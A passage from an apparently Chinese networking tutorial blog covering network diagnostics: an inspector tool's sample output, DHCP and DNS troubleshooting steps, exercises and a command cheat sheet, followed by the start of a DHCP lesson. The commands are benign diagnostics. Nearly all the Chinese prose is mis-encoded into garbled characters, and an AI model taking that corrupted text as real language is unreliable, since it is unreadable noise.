class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="3-3-è¿è¡Œç¤ºä¾‹">3.3 è¿è¡Œç¤ºä¾‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¿è¡Œç¨‹åº</span><br>python code/day14/day14_network_inspector.py<br><br>è¾“å‡ºç¤ºä¾‹ï¼š<br>â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—<br>â•‘       ç½‘ç»œé…ç½®æ£€æµ‹å·¥å…· v1.0                               â•‘<br>â•‘       Network Configuration Inspector                    â•‘<br>â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•<br><br>============================================================<br> ç½‘ç»œé…ç½®æ£€æµ‹å·¥å…· - Network Inspector<br>============================================================<br><br>[1/5] æ­£åœ¨è·å–æœ¬æœºç½‘ç»œé…ç½®...<br>  ä¸»æœºå:    DESKTOP-ABC123<br>  æœ¬æœºIP:    192.168.1.100<br>  é»˜è®¤ç½‘å…³:  192.168.1.1<br>  æ“ä½œç³»ç»Ÿ:  Windows<br><br>[2/5] æ­£åœ¨æµ‹è¯•ç½‘å…³è¿é€šæ€§...<br>  âœ… è¿æ¥æˆåŠŸ (192.168.1.1:80) - å»¶è¿Ÿ: 1.23ms<br><br>[3/5] æ­£åœ¨æµ‹è¯•å¤–ç½‘è¿é€šæ€§...<br>  âœ… è¿æ¥æˆåŠŸ (8.8.8.8:53) - å»¶è¿Ÿ: 15.67ms<br>  âœ… è¿æ¥æˆåŠŸ (114.114.114.114:53) - å»¶è¿Ÿ: 12.34ms<br>  âœ… è¿æ¥æˆåŠŸ (1.1.1.1:53) - å»¶è¿Ÿ: 18.90ms<br><br>[4/5] æ­£åœ¨æµ‹è¯•DNSè§£æ...<br>  âœ… DNSè§£ææˆåŠŸ<br>     www.baidu.com â†’ 39.156.66.10<br>     æŸ¥è¯¢æ—¶é—´: 45.67ms<br>  âœ… DNSè§£ææˆåŠŸ<br>     www.google.com â†’ 172.217.160.68<br>     æŸ¥è¯¢æ—¶é—´: 23.45ms<br>  âœ… DNSè§£ææˆåŠŸ<br>     www.github.com â†’ 20.205.243.166<br>     æŸ¥è¯¢æ—¶é—´: 34.56ms<br><br>[5/5] æ­£åœ¨ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š...<br></code></pre></td></tr></table></figure><hr><h2 id="4-å¸¸è§ç½‘ç»œé—®é¢˜è¯Šæ–­">4. å¸¸è§ç½‘ç»œé—®é¢˜è¯Šæ–­</h2><h3 id="4-1-é—®é¢˜è¯Šæ–­æµç¨‹å›¾">4.1 é—®é¢˜è¯Šæ–­æµç¨‹å›¾</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs dos">ç½‘ç»œæ— æ³•è®¿é—®ï¼Ÿ<br>â”‚<br>â”œâ”€ æ­¥éª¤<span class="hljs-number">1</span>: æ£€æŸ¥ç‰©ç†è¿æ¥<br>â”‚   â”œâ”€ ç½‘çº¿æ˜¯å¦æ’å¥½ï¼Ÿ<br>â”‚   â”œâ”€ WiFiæ˜¯å¦è¿æ¥ï¼Ÿ<br>â”‚   â””â”€ ç½‘å¡æŒ‡ç¤ºç¯æ˜¯å¦äº®ï¼Ÿ<br>â”‚<br>â”œâ”€ æ­¥éª¤<span class="hljs-number">2</span>: æ£€æŸ¥IPé…ç½®<br>â”‚   â”œâ”€ IPåœ°å€: <span class="hljs-built_in">ipconfig</span> / ip addr<br>â”‚   â”œâ”€ å­ç½‘æ©ç æ­£ç¡®ï¼Ÿ<br>â”‚   â”œâ”€ ç½‘å…³é…ç½®æ­£ç¡®ï¼Ÿ<br>â”‚   â””â”€ DNSæœåŠ¡å™¨é…ç½®æ­£ç¡®ï¼Ÿ<br>â”‚<br>â”œâ”€ æ­¥éª¤<span class="hljs-number">3</span>: <span class="hljs-built_in">Ping</span>æµ‹è¯•<br>â”‚   â”œâ”€ <span class="hljs-built_in">ping</span> <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> (æœ¬æœº)<br>â”‚   â”œâ”€ <span class="hljs-built_in">ping</span> ç½‘å…³<br>â”‚   â”œâ”€ <span class="hljs-built_in">ping</span> DNSæœåŠ¡å™¨<br>â”‚   â””â”€ <span class="hljs-built_in">ping</span> å¤–ç½‘IP (<span class="hljs-number">8</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span>)<br>â”‚<br>â”œâ”€ æ­¥éª¤<span class="hljs-number">4</span>: DNSæµ‹è¯•<br>â”‚   â”œâ”€ nslookup www.baidu.com<br>â”‚   â””â”€ æ£€æŸ¥DNSè§£ææ˜¯å¦æ­£å¸¸<br>â”‚<br>â””â”€ æ­¥éª¤<span class="hljs-number">5</span>: è·¯ç”±æµ‹è¯•<br>    â””â”€ traceroute/tracert æ£€æŸ¥è·¯å¾„<br></code></pre></td></tr></table></figure><h3 id="4-2-å¸¸è§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ">4.2 å¸¸è§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ</h3><p><strong>é—®é¢˜1ï¼šè·å–ä¸åˆ°IPåœ°å€ï¼ˆ169.254.x.xï¼‰</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">åŸå› ï¼š<br>- DHCPæœåŠ¡å™¨æ•…éšœ<br>- ç½‘ç»œçº¿è·¯é—®é¢˜<br>- DHCPæœåŠ¡æœªå¯åŠ¨<br><br>è§£å†³æ–¹æ³•ï¼š<br>1. é‡å¯ç½‘å¡<br>   <span class="hljs-comment"># Windows</span><br>   ipconfig /release<br>   ipconfig /renew<br><br>   <span class="hljs-comment"># Linux</span><br>   <span class="hljs-built_in">sudo</span> dhclient -r<br>   <span class="hljs-built_in">sudo</span> dhclient<br><br>2. æ£€æŸ¥DHCPæœåŠ¡å™¨<br>3. æ‰‹åŠ¨é…ç½®é™æ€IP<br></code></pre></td></tr></table></figure><p><strong>é—®é¢˜2ï¼šèƒ½Pingé€šIPä½†æ— æ³•è®¿é—®ç½‘ç«™</strong></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">åŸå› ï¼š</span><br><span class="hljs-attribute">- DNSæœåŠ¡å™¨æ•…éšœ</span><br><span class="hljs-attribute">- DNSé…ç½®é”™è¯¯</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">è§£å†³æ–¹æ³•ï¼š</span><br><span class="hljs-attribute">1. æ›´æ¢DNSæœåŠ¡å™¨</span><br><span class="hljs-attribute">   Windows</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç½‘ç»œé€‚é…å™¨è®¾ç½®</span><br>   <span class="hljs-attribute">Linux</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/etc/resolv.conf</span><br><br>   <span class="hljs-attribute">æ¨èDNS</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">8.8.8.8 (Google)</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">114.114.114.114 (114DNS)</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">1.1.1.1 (Cloudflare)</span><br><br>2. æ¸…é™¤DNSç¼“å­˜<br>   <span class="hljs-comment"># Windows</span><br>   ipconfig /flushdns<br><br>   <span class="hljs-comment"># Linux</span><br>   sudo systemd-resolve --flush-caches<br></code></pre></td></tr></table></figure><p><strong>é—®é¢˜3ï¼šç½‘é€Ÿå¾ˆæ…¢</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŸå› ï¼š<br><span class="hljs-bullet">-</span> ç½‘ç»œæ‹¥å µ<br><span class="hljs-bullet">-</span> å¸¦å®½é™åˆ¶<br><span class="hljs-bullet">-</span> DNSè§£ææ…¢<br><span class="hljs-bullet">-</span> è·¯ç”±é—®é¢˜<br><br>è¯Šæ–­æ–¹æ³•ï¼š<br><span class="hljs-bullet">1.</span> æµ‹è¯•å¸¦å®½<br>   ä½¿ç”¨speedtestç­‰å·¥å…·<br><br><span class="hljs-bullet">2.</span> æ£€æŸ¥å»¶è¿Ÿ<br>   ping -n 100 ç½‘å…³<br>   æ£€æŸ¥å¹³å‡å»¶è¿Ÿå’ŒæŠ–åŠ¨<br><br><span class="hljs-bullet">3.</span> è¿½è¸ªè·¯ç”±<br>   tracert www.baidu.com<br>   æŸ¥çœ‹å“ªä¸€è·³å»¶è¿Ÿé«˜<br><br><span class="hljs-bullet">4.</span> ä¼˜åŒ–DNS<br>   æ›´æ¢æ›´å¿«çš„DNSæœåŠ¡å™¨<br></code></pre></td></tr></table></figure><hr><h2 id="5-ç¬¬ä¸€é˜¶æ®µæŠ€èƒ½æ¸…å•">5. ç¬¬ä¸€é˜¶æ®µæŠ€èƒ½æ¸…å•</h2><p>å®Œæˆç¬¬ä¸€é˜¶æ®µåï¼Œä½ åº”è¯¥æŒæ¡ï¼š</p><h3 id="5-1-ç†è®ºçŸ¥è¯†">5.1 ç†è®ºçŸ¥è¯†</h3><ul><li>âœ… ç†è§£OSIä¸ƒå±‚æ¨¡å‹å’ŒTCP/IPå››å±‚æ¨¡å‹</li><li>âœ… æŒæ¡IPåœ°å€åˆ†ç±»å’Œå­ç½‘åˆ’åˆ†</li><li>âœ… ç†è§£MACåœ°å€å’ŒARPåè®®</li><li>âœ… æŒæ¡DNSå’ŒDHCPå·¥ä½œåŸç†</li><li>âœ… ç†è§£ç«¯å£å’ŒSocketæ¦‚å¿µ</li></ul><h3 id="5-2-å·¥å…·ä½¿ç”¨">5.2 å·¥å…·ä½¿ç”¨</h3><ul><li>âœ… ping - æµ‹è¯•è¿é€šæ€§</li><li>âœ… traceroute/tracert - è¿½è¸ªè·¯ç”±</li><li>âœ… ipconfig/ifconfig - æŸ¥çœ‹ç½‘ç»œé…ç½®</li><li>âœ… nslookup/dig - DNSæŸ¥è¯¢</li><li>âœ… arp - æŸ¥çœ‹ARPç¼“å­˜</li><li>âœ… Wireshark - æŠ“åŒ…åˆ†æ</li></ul><h3 id="5-3-ç¼–ç¨‹èƒ½åŠ›">5.3 ç¼–ç¨‹èƒ½åŠ›</h3><ul><li>âœ… ä½¿ç”¨Python socketåº“</li><li>âœ… å®ç°ç½‘ç»œè¿æ¥æ£€æµ‹</li><li>âœ… å®ç°å±€åŸŸç½‘æ‰«æ</li><li>âœ… å®ç°ç®€å•çš„pingå’Œtraceroute</li><li>âœ… å®ç°DNSæŸ¥è¯¢å·¥å…·</li></ul><h3 id="5-4-é—®é¢˜æ’æŸ¥">5.4 é—®é¢˜æ’æŸ¥</h3><ul><li>âœ… ç³»ç»ŸåŒ–çš„ç½‘ç»œé—®é¢˜è¯Šæ–­æµç¨‹</li><li>âœ… ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·æ’æŸ¥é—®é¢˜</li><li>âœ… åˆ†æç½‘ç»œé…ç½®é”™è¯¯</li><li>âœ… è§£å†³å¸¸è§ç½‘ç»œé—®é¢˜</li></ul><hr><h2 id="6-ä»Šæ—¥ç»ƒä¹ ">6. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šç»¼åˆè¯Šæ–­">ç»ƒä¹ 1ï¼šç»¼åˆè¯Šæ–­</h3><p>è¿è¡Œday14çš„ç½‘ç»œæ£€æµ‹å·¥å…·ï¼Œåˆ†æè¾“å‡ºç»“æœï¼Œå›ç­”ï¼š</p><ol><li>ä½ çš„æœ¬æœºIPåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿå±äºå“ªä¸€ç±»ï¼Ÿ</li><li>é»˜è®¤ç½‘å…³æ˜¯ä»€ä¹ˆï¼Ÿ</li><li>DNSè§£æé€Ÿåº¦å¦‚ä½•ï¼Ÿ</li><li>æ˜¯å¦å­˜åœ¨ç½‘ç»œé—®é¢˜ï¼Ÿ</li></ol><h3 id="ç»ƒä¹ 2ï¼šå­ç½‘åˆ’åˆ†">ç»ƒä¹ 2ï¼šå­ç½‘åˆ’åˆ†</h3><p>ç»™å®šç½‘ç»œ 192.168.10.0/24ï¼Œåˆ’åˆ†ä¸ºï¼š</p><ol><li>4ä¸ªç›¸ç­‰çš„å­ç½‘</li><li>è®¡ç®—æ¯ä¸ªå­ç½‘çš„ç½‘ç»œåœ°å€ã€å¹¿æ’­åœ°å€ã€å¯ç”¨IPèŒƒå›´</li><li>é€‰æ‹©CIDRè¡¨ç¤ºæ³•</li></ol><h3 id="ç»ƒä¹ 3ï¼šæ•…éšœæ’æŸ¥">ç»ƒä¹ 3ï¼šæ•…éšœæ’æŸ¥</h3><p>å‡è®¾åœºæ™¯ï¼š</p><ul><li>èƒ½pingé€š192.168.1.1ï¼ˆç½‘å…³ï¼‰</li><li>èƒ½pingé€š8.8.8.8</li><li><a href="http://xn--www-7z8f502aym2co5o.baidu.com">æ— æ³•è®¿é—®www.baidu.com</a></li></ul><p>è¯·ä½¿ç”¨æ‰€å­¦çš„è¯Šæ–­æ–¹æ³•ï¼Œæ‰¾å‡ºé—®é¢˜åŸå› å¹¶ç»™å‡ºè§£å†³æ–¹æ¡ˆã€‚</p><h3 id="ç»ƒä¹ 4ï¼šæŠ“åŒ…åˆ†æ">ç»ƒä¹ 4ï¼šæŠ“åŒ…åˆ†æ</h3><p>ä½¿ç”¨Wiresharkï¼š</p><ol><li>æŠ“å–ä¸€æ¬¡å®Œæ•´çš„DHCPå››æ¬¡æ¡æ‰‹</li><li>åˆ†ææ¯ä¸ªæ•°æ®åŒ…çš„å†…å®¹</li><li>è¯†åˆ«DORAå››ä¸ªé˜¶æ®µ</li><li>æˆªå›¾æ ‡æ³¨å…³é”®ä¿¡æ¯</li></ol><hr><h2 id="7-æ‰©å±•å­¦ä¹ ">7. æ‰©å±•å­¦ä¹ </h2><h3 id="7-1-æ¨èé˜…è¯»">7.1 æ¨èé˜…è¯»</h3><ul><li>RFC 791: Internet Protocol (IP)</li><li>RFC 826: Address Resolution Protocol (ARP)</li><li>RFC 792: Internet Control Message Protocol (ICMP)</li><li>RFC 2131: Dynamic Host Configuration Protocol (DHCP)</li><li>RFC 1035: Domain Names - Implementation and Specification (DNS)</li></ul><h3 id="7-2-åœ¨çº¿èµ„æº">7.2 åœ¨çº¿èµ„æº</h3><ul><li>Wiresharkå®˜æ–¹æ•™ç¨‹</li><li>å­ç½‘åˆ’åˆ†åœ¨çº¿è®¡ç®—å™¨</li><li>ç½‘ç»œåè®®åˆ†ææ¡ˆä¾‹</li></ul><h3 id="7-3-å®è·µå»ºè®®">7.3 å®è·µå»ºè®®</h3><ol><li>æ­å»ºè™šæ‹Ÿå®éªŒç¯å¢ƒï¼ˆVirtualBox + å¤šå°è™šæ‹Ÿæœºï¼‰</li><li>é…ç½®ä¸åŒçš„ç½‘ç»œæ‹“æ‰‘</li><li>æ¨¡æ‹Ÿå„ç§ç½‘ç»œæ•…éšœ</li><li>ç»ƒä¹ é—®é¢˜è¯Šæ–­å’Œè§£å†³</li></ol><hr><h2 id="8-ä¸‹ä¸€é˜¶æ®µé¢„å‘Š">8. ä¸‹ä¸€é˜¶æ®µé¢„å‘Š</h2><h3 id="ç¬¬äºŒé˜¶æ®µï¼šåº”ç”¨å±‚åè®®æ·±å…¥ï¼ˆDay-15-27ï¼‰">ç¬¬äºŒé˜¶æ®µï¼šåº”ç”¨å±‚åè®®æ·±å…¥ï¼ˆDay 15-27ï¼‰</h3><p><strong>ç¬¬3å‘¨ï¼šä¼ è¾“å±‚åè®®åŸºç¡€</strong></p><ul><li>TCPåè®®è¯¦è§£</li><li>TCPå¯é ä¼ è¾“æœºåˆ¶</li><li>UDPåè®®</li><li>Socketç¼–ç¨‹</li></ul><p><strong>ç¬¬4å‘¨ï¼šç½‘ç»œå±‚åè®®æ·±å…¥</strong></p><ul><li>IPåè®®æ·±å…¥</li><li>IPv6</li><li>ICMPè¯¦è§£</li><li>è·¯ç”±åè®®åŸºç¡€</li></ul><p>å­¦ä¹ é‡ç‚¹ï¼š</p><ul><li>æ·±å…¥ç†è§£TCP/IPæ ¸å¿ƒåè®®</li><li>æŒæ¡Socketç½‘ç»œç¼–ç¨‹</li><li>å­¦ä¹ ç½‘ç»œå±‚è·¯ç”±æœºåˆ¶</li><li>å®Œæˆæ›´å¤æ‚çš„å®æˆ˜é¡¹ç›®</li></ul><hr><h2 id="9-æ€»ç»“">9. æ€»ç»“</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ç¬¬ä¸€é˜¶æ®µå­¦ä¹ è·¯å¾„ï¼š<br><br>ç½‘ç»œåŸºç¡€æ¦‚å¿µ â†’ åè®®åˆ†å±‚æ¨¡å‹ â†’ è¯Šæ–­å·¥å…·<br>       â†“              â†“            â†“<br>   ç½‘ç»œæ‹“æ‰‘        OSI/TCP-<span class="hljs-built_in">IP</span>     ping/traceroute<br>                      â†“<br>              <span class="hljs-built_in">IP</span>åœ°å€å’Œå­ç½‘åˆ’åˆ†<br>                      â†“<br>              MACåœ°å€å’ŒARP<br>                      â†“<br>              DNSå’ŒDHCP<br>                      â†“<br>           ç»¼åˆå®æˆ˜ï¼šç½‘ç»œè¯Šæ–­å·¥å…·<br><br>æ ¸å¿ƒèƒ½åŠ›ï¼š<br>âœ… ç½‘ç»œåŸºç¡€ç†è®º<br>âœ… åè®®å·¥ä½œåŸç†<br>âœ… å·¥å…·ä½¿ç”¨<br>âœ… ç¼–ç¨‹å®ç°<br>âœ… é—®é¢˜è¯Šæ–­<br><br>å­¦ä¹ å¿ƒå¾—ï¼š<br>ç½‘ç»œåŸºç¡€æ˜¯æ‰€æœ‰ç½‘ç»œæŠ€æœ¯çš„æ ¹åŸºã€‚<br>ç†è§£äº†<span class="hljs-built_in">IP</span>åœ°å€ã€å­ç½‘åˆ’åˆ†ã€ARPã€DNSè¿™äº›åŸºç¡€æ¦‚å¿µï¼Œ<br>å°±åƒæŒæ¡äº†ç½‘ç»œä¸–ç•Œçš„<span class="hljs-string">&quot;å­—æ¯è¡¨&quot;</span>ã€‚<br><br>æ¥ä¸‹æ¥æˆ‘ä»¬å°†æ·±å…¥ä¼ è¾“å±‚å’Œç½‘ç»œå±‚ï¼Œ<br>å­¦ä¹ TCP/<span class="hljs-built_in">IP</span>åè®®æ ˆçš„æ ¸å¿ƒæœºåˆ¶ã€‚<br><br>ç»§ç»­åŠ æ²¹ï¼ğŸ’ª<br></code></pre></td></tr></table></figure><hr><p><strong>è¿›åº¦ï¼š14/120å¤©ï¼ˆ11.7%ï¼‰</strong></p><p>æ­å–œå®Œæˆç¬¬ä¸€é˜¶æ®µå­¦ä¹ ï¼ä½ å·²ç»å»ºç«‹äº†æ‰å®çš„ç½‘ç»œåŸºç¡€çŸ¥è¯†ã€‚æ¥ä¸‹æ¥çš„å­¦ä¹ å°†æ›´åŠ æ·±å…¥å’Œç²¾å½©ï¼Œè®©æˆ‘ä»¬ç»§ç»­å‰è¿›ï¼</p><hr><h2 id="é™„å½•ï¼šå¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨">é™„å½•ï¼šå¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨</h2><h3 id="Windowså‘½ä»¤">Windowså‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /all              <span class="hljs-comment"># æŸ¥çœ‹è¯¦ç»†ç½‘ç»œé…ç½®</span><br>ipconfig /release          <span class="hljs-comment"># é‡Šæ”¾DHCPåˆ†é…çš„IP</span><br>ipconfig /renew            <span class="hljs-comment"># é‡æ–°è·å–IP</span><br>ipconfig /flushdns         <span class="hljs-comment"># æ¸…é™¤DNSç¼“å­˜</span><br>ipconfig /displaydns       <span class="hljs-comment"># æ˜¾ç¤ºDNSç¼“å­˜</span><br><br>ping &lt;IP&gt;                  <span class="hljs-comment"># æµ‹è¯•è¿é€šæ€§</span><br>ping -t &lt;IP&gt;              <span class="hljs-comment"># æŒç»­ping</span><br>tracert &lt;åŸŸå&gt;             <span class="hljs-comment"># è¿½è¸ªè·¯ç”±</span><br>nslookup &lt;åŸŸå&gt;            <span class="hljs-comment"># DNSæŸ¥è¯¢</span><br>arp -a                     <span class="hljs-comment"># æŸ¥çœ‹ARPç¼“å­˜</span><br>netstat -an               <span class="hljs-comment"># æŸ¥çœ‹ç½‘ç»œè¿æ¥</span><br>route <span class="hljs-built_in">print</span>               <span class="hljs-comment"># æŸ¥çœ‹è·¯ç”±è¡¨</span><br></code></pre></td></tr></table></figure><h3 id="Linux-Macå‘½ä»¤">Linux/Macå‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip addr show              <span class="hljs-comment"># æŸ¥çœ‹ç½‘ç»œé…ç½®</span><br>ip route show             <span class="hljs-comment"># æŸ¥çœ‹è·¯ç”±è¡¨</span><br>ifconfig                  <span class="hljs-comment"># æŸ¥çœ‹ç½‘ç»œæ¥å£ï¼ˆæ—§ï¼‰</span><br><br>ping &lt;IP&gt;                 <span class="hljs-comment"># æµ‹è¯•è¿é€šæ€§</span><br>ping -c 4 &lt;IP&gt;           <span class="hljs-comment"># ping 4æ¬¡</span><br>traceroute &lt;åŸŸå&gt;         <span class="hljs-comment"># è¿½è¸ªè·¯ç”±</span><br>dig &lt;åŸŸå&gt;                <span class="hljs-comment"># DNSæŸ¥è¯¢ï¼ˆè¯¦ç»†ï¼‰</span><br>nslookup &lt;åŸŸå&gt;           <span class="hljs-comment"># DNSæŸ¥è¯¢ï¼ˆç®€å•ï¼‰</span><br><br>arp -a                    <span class="hljs-comment"># æŸ¥çœ‹ARPç¼“å­˜</span><br>netstat -an              <span class="hljs-comment"># æŸ¥çœ‹ç½‘ç»œè¿æ¥</span><br>ss -tulpn                <span class="hljs-comment"># æŸ¥çœ‹ç›‘å¬ç«¯å£</span><br><br><span class="hljs-built_in">sudo</span> dhclient -r         <span class="hljs-comment"># é‡Šæ”¾IP</span><br><span class="hljs-built_in">sudo</span> dhclient            <span class="hljs-comment"># è·å–IP</span><br><span class="hljs-built_in">sudo</span> systemd-resolve --flush-caches  <span class="hljs-comment"># æ¸…é™¤DNSç¼“å­˜</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>13å¤©ï¼šDHCPåè®®è¯¦è§£</title>
    <link href="/2025/11/10/13%E5%A4%A9%EF%BC%9ADHCP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/13%E5%A4%A9%EF%BC%9ADHCP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬13å¤©ï¼šDHCPåè®®è¯¦è§£</h1><h2 id="ä»Šæ—¥ç›®æ ‡">ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£DHCPçš„å·¥ä½œåŸç†å’Œä½œç”¨</li><li>æŒæ¡DHCPå››æ¬¡æ¡æ‰‹è¿‡ç¨‹</li><li>äº†è§£IPåœ°å€ç§Ÿçº¦ç®¡ç†æœºåˆ¶</li><li>å­¦ä¼šåˆ†æDHCPæ•°æ®åŒ…</li><li>å®ç°DHCPæœåŠ¡å™¨æ¨¡æ‹Ÿå™¨</li></ul><hr><h2 id="1-ä»€ä¹ˆæ˜¯DHCPï¼Ÿ">1. ä»€ä¹ˆæ˜¯DHCPï¼Ÿ</h2><h3 id="1-1-DHCPçš„å®šä¹‰">1.1 DHCPçš„å®šä¹‰</h3><p><strong>DHCPï¼ˆDynamic Host Configuration Protocolï¼ŒåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼‰</strong> æ˜¯ä¸€ç§ç½‘ç»œç®¡ç†åè®®ï¼Œç”¨äºè‡ªåŠ¨åˆ†é…IPåœ°å€å’Œç½‘ç»œé…ç½®ã€‚</p><p><strong>ç”Ÿæ´»ç±»æ¯”</strong>ï¼š</p><ul><li>ä½ å»é…’åº—å…¥ä½ï¼Œä¸éœ€è¦è‡ªå·±å†³å®šä½å“ªä¸ªæˆ¿é—´</li><li>å‰å°ä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªç©ºæˆ¿é—´ç»™ä½ </li><li>é€€æˆ¿åï¼Œæˆ¿é—´å¯ä»¥åˆ†é…ç»™å…¶ä»–å®¢äºº</li><li>DHCPå°±æ˜¯ç½‘ç»œä¸­çš„&quot;å‰å°&quot;ï¼Œè‡ªåŠ¨åˆ†é…IPåœ°å€</li></ul><h3 id="1-2-ä¸ºä»€ä¹ˆéœ€è¦DHCPï¼Ÿ">1.2 ä¸ºä»€ä¹ˆéœ€è¦DHCPï¼Ÿ</h3><p><strong>æ²¡æœ‰DHCPçš„ç—›è‹¦</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 